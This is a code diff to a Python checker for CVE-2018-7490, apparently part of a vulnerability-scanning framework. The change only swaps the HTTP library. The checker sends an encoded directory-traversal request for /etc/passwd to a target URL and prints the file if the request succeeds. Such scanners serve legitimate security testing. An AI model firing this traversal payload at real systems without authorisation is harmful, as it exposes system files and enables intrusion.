@@ -5,9 +5,8 @@ name: CVE-2018-7490漏洞
 description: CVE-2018-7490漏洞可穿越目录查看其他文件
 '''
 
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2018_7490_BaseVerify:
     def __init__(self, url):
@@ -23,7 +22,7 @@ class CVE_2018_7490_BaseVerify:
             self.url = "http://" + self.url
         url = self.url + '/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
         try:
-            res = requests.get(url, headers = self.headers, verify = False, allow_redirects=False)
+            res = request.get(url, headers = self.headers)
             if res.status_code == 200 :
                 print('存在CVE-2018-7490漏洞,穿越目录成功，查看的/etc/passwd文件内容是:\n',res.content.decode('utf-8'))
                 return True
